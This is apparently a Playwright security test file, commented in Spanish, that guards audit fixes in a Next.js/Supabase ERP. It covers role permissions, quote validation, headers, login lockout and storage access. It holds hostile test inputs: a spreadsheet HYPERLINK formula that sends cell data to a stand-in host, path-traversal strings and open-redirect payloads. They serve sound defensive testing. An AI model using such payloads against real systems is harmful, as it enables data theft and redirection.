import crypto from "node:crypto";
import fs from "node:fs";
import type { Browser, Page } from "@playwright/test";
import { expect, test } from "./fixtures";
import { ROLES, sesion, sql, sql1, sqlScript } from "./lib";

// Auditoría de seguridad (05/11/2026): un caso por hallazgo corregido, para que no vuelva.
// Migración 20261105130000_prod1_seguridad, src/proxy.ts (/sb), next.config.ts (cabeceras), login (intentos),
// requireSesionVigente (Admin con la clave secreta) y el CSV de la auditoría.

const SB = "http://127.0.0.1:55321";
const env = Object.fromEntries(
  fs
    .readFileSync(".env.local", "utf8")
    .split(/\r?\n/)
    .filter((l) => /^[A-Z_]+=/.test(l))
    .map((l) => [l.slice(0, l.indexOf("=")), l.slice(l.indexOf("=") + 1).replace(/^["']|["']$/g, "")]),
);
const ANON = env.NEXT_PUBLIC_SUPABASE_ANON_KEY;
const SECRETA = env.SUPABASE_SECRET_KEY;

async function token(email: string) {
  const r = await fetch(`${SB}/auth/v1/token?grant_type=password`, {
    method: "POST",
    headers: { apikey: ANON, "Content-Type": "application/json" },
    body: JSON.stringify({ email, password: process.env.ERP_PASS }),
  });
  return (await r.json()).access_token as string;
}
const rest = (jwt: string | null, ruta: string, init: RequestInit = {}) =>
  fetch(`${SB}/rest/v1/${ruta}`, {
    ...init,
    headers: { apikey: ANON, Authorization: `Bearer ${jwt ?? ANON}`, "Content-Type": "application/json", ...(init.headers ?? {}) },
  });

async function alLogin(browser: Browser, info: { project: { use: object } }): Promise<Page> {
  const ctx = await browser.newContext({ ...info.project.use });
  const page = await ctx.newPage();
  await page.goto("/acceso");
  if (page.url().includes("/acceso")) {
    await page.locator('input[name="clave"]').fill(process.env.ERP_DEMO!);
    await page.getByRole("button", { name: "Entrar" }).click();
    await page.waitForURL((u) => !u.pathname.startsWith("/acceso"));
  }
  await page.goto("/login");
  return page;
}

test.describe("@seguridad", () => {
  test.beforeEach(({}, info) => {
    test.skip(info.project.name !== "m390", "API y base: basta con un proyecto");
  });

  test("el token del link de cotización solo lo ve Logística", async () => {
    const [log, tes, ger, jef] = await Promise.all([ROLES.logistica, ROLES.tesoreria, ROLES.gerencia, ROLES.jefe].map(token));
    const tokens = async (jwt: string) =>
      ((await (await rest(jwt, "v_ordenes?select=token_cotizacion&token_cotizacion=not.is.null&limit=5")).json()) as unknown[]).length;
    expect(await tokens(log)).toBeGreaterThan(0);
    for (const jwt of [tes, ger, jef]) expect(await tokens(jwt)).toBe(0);
    // La columna, directo de la tabla: nadie (ni Logística; ella la ve por la vista).
    for (const jwt of [log, tes, ger, jef]) expect((await rest(jwt, "ordenes_compra?select=token_cotizacion&limit=1")).status).toBe(403);
    // El resto de la tabla se sigue leyendo.
    expect((await rest(tes, "ordenes_compra?select=obra_id,numero&limit=1")).status).toBe(200);
  });

  test("el proveedor no puede cotizar en 0", async () => {
    const [t, item] = sql(`select o.token_cotizacion, i.id from ordenes_compra o join oc_items i on i.obra_id = o.obra_id and i.numero_oc = o.numero
                           where o.token_cotizacion is not null and o.estado = 'EMITIDA' and o.cotizacion_estado = 'ENVIADA' order by o.obra_id, o.numero limit 1`)[0] ?? [];
    test.skip(!t, "sin links de cotización abiertos");
    const r = await rest(null, "rpc/enviar_cotizacion", { method: "POST", body: JSON.stringify({ p_token: t, p_precios: [{ item_id: Number(item), pu: 0 }] }) });
    expect(r.status).toBeGreaterThanOrEqual(400);
    expect(sql1(`select cotizacion_estado from ordenes_compra where token_cotizacion = '${t}'`)).toBe("ENVIADA");
  });

  test("tokens falsos no bloquean los links reales (en una transacción)", () => {
    const t = sql1(`select token_cotizacion from ordenes_compra where token_cotizacion is not null and estado = 'EMITIDA' and cotizacion_estado = 'ENVIADA' limit 1`);
    test.skip(!t, "sin links de cotización abiertos");
    const r = sqlScript(`begin;
      insert into cotizacion_accesos (token, accion, ok) select gen_random_uuid(), 'VER', false from generate_series(1, 80);
      set local role anon;
      select 'G', (get_cotizacion('${t}'::uuid)) is not null;
      rollback;`);
    expect(r.find((f) => f[0] === "G")?.[1]).toBe("t");
  });

  test("Logística clasifica ítems pero no cambia su tolerancia ni su descripción", async () => {
    const jwt = await token(ROLES.logistica);
    const [id, tipo] = sql(`select id, coalesce(tipo_material, '') from items order by id limit 1`)[0];
    const tol = await rest(jwt, `items?id=eq.${id}`, { method: "PATCH", body: JSON.stringify({ tolerancia_pct: 0.99 }) });
    expect(tol.status).toBe(403);
    const desc = await rest(jwt, `items?id=eq.${id}`, { method: "PATCH", body: JSON.stringify({ descripcion: "X" }) });
    expect(desc.status).toBe(403);
    const ok = await rest(jwt, `items?id=eq.${id}`, { method: "PATCH", body: JSON.stringify({ tipo_material: tipo || null }) });
    expect(ok.status).toBeLessThan(300);
  });

  test("roles fuera de prod 1 no leen nada y el Jefe no escribe ni ve contratos", async () => {
    const [con, res, jef] = await Promise.all([ROLES.contabilidad, ROLES.residente, ROLES.jefe].map(token));
    for (const jwt of [con, res]) {
      for (const t of ["ordenes_compra?select=obra_id", "proveedor_cuentas?select=proveedor_id", "comprobantes?select=id"]) {
        expect(await (await rest(jwt, `${t}&limit=1`)).json(), `${t}`).toEqual([]);
      }
    }
    const v = await rest(jef, "rpc/valorizar", { method: "POST", body: JSON.stringify({ p_obra_id: -1 }) });
    expect((await v.json()).message).toMatch(/No tienes permiso/);
    const contrato = sql1(`select name from storage.objects where bucket_id = 'documentos' and name like '%/CONTRATO/%' limit 1`);
    test.skip(!contrato, "sin contratos");
    const d = await fetch(`${SB}/storage/v1/object/authenticated/documentos/${contrato}`, { headers: { apikey: ANON, Authorization: `Bearer ${jef}` } });
    expect(d.status).toBeGreaterThanOrEqual(400);
  });

  test("/sb: sin la clave secreta, sin service_role, sin la administración de Auth", async ({ baseURL }) => {
    const admin = await fetch(`${baseURL}/sb/auth/v1/admin/users`, { headers: { apikey: ANON, Authorization: `Bearer ${ANON}` } });
    expect(admin.status).toBe(403);
    const secreta = await fetch(`${baseURL}/sb/rest/v1/obras?select=id`, { headers: { apikey: SECRETA, Authorization: `Bearer ${SECRETA}` } });
    expect(secreta.status).toBe(403);
    // Sin la contraseña de la demo (si está activa), nada.
    if (env.DEMO_ACCESO) {
      const sinDemo = await fetch(`${baseURL}/sb/rest/v1/obras?select=id`, { headers: { apikey: ANON } });
      expect(sinDemo.status).toBe(403);
    }
  });

  test("cabeceras de seguridad", async ({ baseURL }) => {
    const r = await fetch(`${baseURL}/login`, { redirect: "manual" });
    expect(r.headers.get("x-frame-options")).toBe("DENY");
    expect(r.headers.get("x-content-type-options")).toBe("nosniff");
    expect(r.headers.get("content-security-policy")).toMatch(/frame-ancestors 'none'/);
  });

  // Con CAPTCHA (en local, las claves de prueba de Turnstile) la cuenta no se bloquea: pide CAPTCHA (así nadie deja
  // afuera a otro a propósito). Sin claves, se bloquea 15 minutos.
  test("login: tras 10 intentos fallidos la cuenta pide CAPTCHA (o queda en espera sin CAPTCHA)", async ({ browser }, info) => {
    const email = `e2e-fuerza-${crypto.randomUUID().slice(0, 8)}@erp.local`;
    sql(`insert into audit_log (tabla, accion, detalle)
         select 'sesion', 'LOGIN_FALLIDO', jsonb_build_object('email', '${email}', 'motivo', 'invalid_credentials') from generate_series(1, 10)`);
    const page = await alLogin(browser, info);
    await page.locator('input[name="email"]').fill(email);
    await page.locator('input[name="password"]').fill("cualquiera1");
    await page.getByRole("button", { name: "Ingresar", exact: true }).click();
    if (process.env.NEXT_PUBLIC_TURNSTILE_SITE_KEY ?? env.NEXT_PUBLIC_TURNSTILE_SITE_KEY) {
      await expect(page.locator('p[role="alert"]')).toHaveText("Completa la verificación");
      await expect(page.locator('[data-captcha="visible"]')).toHaveCount(1);
    } else {
      await expect(page.getByText(/Demasiados intentos/)).toBeVisible();
    }
    sql(`delete from audit_log where tabla = 'sesion' and detalle->>'email' = '${email}'`);
    await page.context().close();
  });

  test("un Admin desactivado pierde el panel al instante (aunque su token siga vigente)", async ({ browser }, info) => {
    const email = `e2e-admin-${crypto.randomUUID().slice(0, 8)}@erp.local`;
    const auth = (ruta: string, init: RequestInit) =>
      fetch(`${SB}/auth/v1/admin/${ruta}`, { ...init, headers: { apikey: SECRETA, Authorization: `Bearer ${SECRETA}`, "Content-Type": "application/json" } });
    const u = await (await auth("users", { method: "POST", body: JSON.stringify({ email, password: process.env.ERP_PASS, email_confirm: true }) })).json();
    try {
      sql(`insert into perfiles (user_id, nombre, rol) values ('${u.id}', 'E2E Admin', 'ADMIN')
           on conflict (user_id) do update set rol = 'ADMIN'`);
      const page = await alLogin(browser, info);
      await page.locator('input[name="email"]').fill(email);
      await page.locator('input[name="password"]').fill(process.env.ERP_PASS!);
      await page.getByRole("button", { name: "Ingresar", exact: true }).click();
      await page.waitForURL((x) => !x.pathname.startsWith("/login"));
      await page.goto("/admin");
      await expect(page).toHaveURL(/\/admin$/);
      // Lo desactivan: su token sigue valiendo hasta 1 h, pero el panel (clave secreta) mira la base.
      await auth(`users/${u.id}`, { method: "PUT", body: JSON.stringify({ ban_duration: "876000h" }) });
      await page.goto("/admin");
      await expect(page).toHaveURL(/\/sin-acceso/);
      await page.context().close();
    } finally {
      sql(`delete from audit_log where user_id = '${u.id}' or registro = '${u.id}'`);
      await auth(`users/${u.id}`, { method: "DELETE" });
    }
  });

  test("el CSV de la auditoría no lleva fórmulas", async ({ browser }) => {
    const email = `=HYPERLINK("http://x.invalid/?d="&A2;"e2e")`;
    sql(`insert into audit_log (tabla, accion, detalle) values ('sesion', 'LOGIN_FALLIDO', jsonb_build_object('email', $e$${email}$e$))`);
    try {
      const ctx = await browser.newContext({ storageState: sesion("admin") });
      const r = await ctx.request.get("/admin/auditoria/csv?vista=sesiones");
      const csv = await r.text();
      expect(csv).not.toMatch(/(^|,)"?=HYPERLINK/m);
      expect(csv).toContain(`'=HYPERLINK`);
      await ctx.close();
    } finally {
      sql(`delete from audit_log where detalle->>'email' = $e$${email}$e$`);
    }
  });

  // ── Re-auditoría (05/11/2026), migración prod1_seguridad_2 ──

  test("un adjunto no puede apuntar fuera de su carpeta («..»)", async () => {
    const jwt = await token(ROLES.logistica);
    const [obra, numero] = sql(`select obra_id, numero from ordenes_compra where tipo = 'OS' and estado <> 'ANULADA' and created_by is null order by obra_id limit 1`)[0];
    for (const path of [`${obra}/${numero}/../../../comprobantes/x.png`, `${obra}/${numero}//x.png`, `${obra}/${numero}/%2e%2e/x.png`]) {
      const r = await rest(jwt, "adjuntos", {
        method: "POST",
        body: JSON.stringify({ tipo: "CONTRATO", obra_id: Number(obra), numero_oc: numero, path, nombre: "x.png", mime: "image/png" }),
      });
      expect(r.status, path).toBeGreaterThanOrEqual(400);
    }
    expect(sql1(`select count(*) from adjuntos where path like '%..%' or path like '%//%' or path like '%\\%%'`)).toBe("0");
  });

  test("la cotización no acepta NaN, infinito ni precios absurdos", async () => {
    const [t, item] = sql(`select o.token_cotizacion, i.id from ordenes_compra o join oc_items i on i.obra_id = o.obra_id and i.numero_oc = o.numero
                           where o.token_cotizacion is not null and o.estado = 'EMITIDA' and o.cotizacion_estado = 'ENVIADA' order by o.obra_id, o.numero limit 1`)[0] ?? [];
    test.skip(!t, "sin links de cotización abiertos");
    for (const pu of ["NaN", "Infinity", 1e30, -5]) {
      const r = await rest(null, "rpc/enviar_cotizacion", { method: "POST", body: JSON.stringify({ p_token: t, p_precios: [{ item_id: Number(item), pu }] }) });
      expect(r.status, String(pu)).toBeGreaterThanOrEqual(400);
    }
    expect(sql1(`select count(*) from oc_items where pu_cotizado = 'NaN' or pu_cotizado >= 1e8`)).toBe("0");
    // Datos mal formados: un mensaje propio, no el error de Postgres.
    for (const precios of [[{ item_id: "abc", pu: 1 }], [{ item_id: Number(item), pu: "abc" }], [1, 2], [{ item_id: 1.5, pu: 1 }]]) {
      const r = await rest(null, "rpc/enviar_cotizacion", { method: "POST", body: JSON.stringify({ p_token: t, p_precios: precios }) });
      expect((await r.json()).message, JSON.stringify(precios)).toBe("Formato de precios inválido");
    }
  });

  test("sin la contraseña de la demo no pasa ninguna server action (tampoco en /cotizar)", async ({ baseURL }) => {
    test.skip(!env.DEMO_ACCESO, "sin contraseña de demo");
    const r = await fetch(`${baseURL}/cotizar/${crypto.randomUUID()}`, {
      method: "POST",
      headers: { "Next-Action": "0".repeat(42), "Content-Type": "text/plain;charset=UTF-8", Origin: baseURL! },
      body: "[]",
    });
    expect(r.status).toBe(403);
    // Sin JavaScript una server action va como formulario (sin la cabecera): tampoco.
    const sinJs = await fetch(`${baseURL}/cotizar/${crypto.randomUUID()}`, {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded", Origin: baseURL! },
      body: `$ACTION_ID_${"0".repeat(42)}=`,
    });
    expect(sinJs.status).toBe(403);
  });

  test("la huella y sus desafíos: nadie los lee con su sesión", async () => {
    const jwt = await token(ROLES.gerencia);
    for (const t of ["huellas?select=id", "huella_desafios?select=id"]) {
      expect((await rest(null, t)).status, `anon ${t}`).toBeGreaterThanOrEqual(400);
      expect((await rest(jwt, t)).status, `gerencia ${t}`).toBeGreaterThanOrEqual(400);
    }
  });

  test("sin «X-Powered-By» y los archivos de /sb sin adivinar el tipo", async ({ baseURL }) => {
    const r = await fetch(`${baseURL}/login`, { redirect: "manual" });
    expect(r.headers.get("x-powered-by")).toBeNull();
    if (env.NEXT_PUBLIC_SUPABASE_DIRECTO !== "1") {
      const s = await fetch(`${baseURL}/sb/storage/v1/object/public/documentos/no-existe.xml`, { headers: { Cookie: "" } });
      // Sin la cookie de la demo: 403 (si la hay, lo que pase lleva nosniff y sandbox).
      expect([403, 400, 404]).toContain(s.status);
    }
  });

  // Re-auditoría contra producción (migración 20261105200000_prod1_seguridad_3).

  test("/desbloquear nunca manda a otro dominio", async ({ browser }, info) => {
    const ctx = await browser.newContext({ ...info.project.use, storageState: sesion("tesoreria") });
    const page = await ctx.newPage();
    // El navegador toma «\» como «/» y quita tabuladores: todas serían //example.com.
    for (const volver of ["/%5Cexample.com", "/%5C%5Cexample.com", "/%09/example.com", "//example.com", "/.//example.com", "https://example.com"]) {
      await page.goto(`/desbloquear?volver=${volver}`);
      await page.waitForURL((u) => !u.pathname.startsWith("/desbloquear"), { timeout: 15_000 });
      expect(new URL(page.url()).host, volver).toBe(new URL(info.project.use.baseURL!).host);
    }
    await ctx.close();
  });

  test("cada rol sube archivos solo a sus carpetas", async () => {
    const s = crypto.randomUUID().slice(0, 8);
    const [log, tes, ger, jef] = await Promise.all([ROLES.logistica, ROLES.tesoreria, ROLES.gerencia, ROLES.jefe].map(token));
    const casos: [string, string, string, string, boolean][] = [
      ["TES", tes, "documentos", `pagos/e2e-${s}/v.pdf`, true],
      ["LOG", log, "documentos", `pagos/e2e-${s}/l.pdf`, false],
      ["LOG", log, "documentos", `guias/e2e-${s}/g.pdf`, true],
      ["TES", tes, "documentos", `guias/e2e-${s}/t.pdf`, false],
      ["LOG", log, "documentos", `999999/e2e-${s}/CONTRATO/c.pdf`, true],
      ["GER", ger, "documentos", `999999/e2e-${s}/CONTRATO/g.pdf`, false],
      ["LOG", log, "documentos", `entregas/e2e-${s}/e.pdf`, false],
      ["LOG", log, "documentos", `e2e-${s}/suelto.pdf`, false],
      ["LOG", log, "comprobantes", `e2e-${s}/f.pdf`, true],
      ["TES", tes, "comprobantes", `e2e-${s}/t.pdf`, false],
      ["GER", ger, "comprobantes", `e2e-${s}/g.pdf`, false],
      ["JEF", jef, "documentos", `guias/e2e-${s}/j.pdf`, false],
    ];
    const subidos: [string, string][] = [];
    try {
      const r = await Promise.all(
        casos.map(([, jwt, bucket, ruta]) =>
          fetch(`${SB}/storage/v1/object/${bucket}/${ruta}`, {
            method: "POST",
            headers: { apikey: ANON, Authorization: `Bearer ${jwt}`, "Content-Type": "application/pdf" },
            body: "%PDF-1.4 e2e",
          }),
        ),
      );
      const mal = casos
        .map(([rol, , bucket, ruta, puede], i) => {
          if (r[i].ok) subidos.push([bucket, ruta]);
          return r[i].ok === puede ? null : `${rol} ${bucket}/${ruta}: ${r[i].status}`;
        })
        .filter(Boolean);
      expect(mal).toEqual([]);
    } finally {
      for (const [bucket, ruta] of subidos) {
        await fetch(`${SB}/storage/v1/object/${bucket}`, {
          method: "DELETE",
          headers: { apikey: SECRETA, Authorization: `Bearer ${SECRETA}`, "Content-Type": "application/json" },
          body: JSON.stringify({ prefixes: [ruta] }),
        });
      }
    }
  });

  test("anon y las sesiones no pueden truncar ni crear triggers en las tablas", () => {
    expect(
      sql1(`select count(*) from information_schema.table_privileges
             where table_schema = 'public' and grantee in ('anon', 'authenticated') and privilege_type in ('TRUNCATE', 'TRIGGER', 'REFERENCES')`),
    ).toBe("0");
  });

  test("la contraseña actual la verifica solo el servidor; y el bloqueo, solo el servidor lo levanta", async () => {
    const jwt = await token(ROLES.gerencia);
    for (const [fn, args] of [
      ["contrasena_correcta", { p_user: crypto.randomUUID(), p_clave: "x" }],
      ["bloqueo_desbloquear", { p_session: crypto.randomUUID() }],
      ["bloqueo_quitar", { p_session: crypto.randomUUID(), p_user: crypto.randomUUID() }],
    ] as const) {
      expect((await rest(jwt, `rpc/${fn}`, { method: "POST", body: JSON.stringify(args) })).status, fn).toBeGreaterThanOrEqual(400);
      expect((await rest(null, `rpc/${fn}`, { method: "POST", body: JSON.stringify(args) })).status, `anon ${fn}`).toBeGreaterThanOrEqual(400);
    }
  });

  test("en producción, la lista de usuarios locales y su contraseña no llegan al navegador", () => {
    // El bundle se compila con NEXT_PUBLIC_USUARIOS_LOCALES fija (next.config.ts, env): sin ella, el código se elimina.
    const config = fs.readFileSync("next.config.ts", "utf8");
    expect(config).toMatch(/NEXT_PUBLIC_USUARIOS_LOCALES: process\.env\.NEXT_PUBLIC_USUARIOS_LOCALES \?\? "0"/);
  });
});
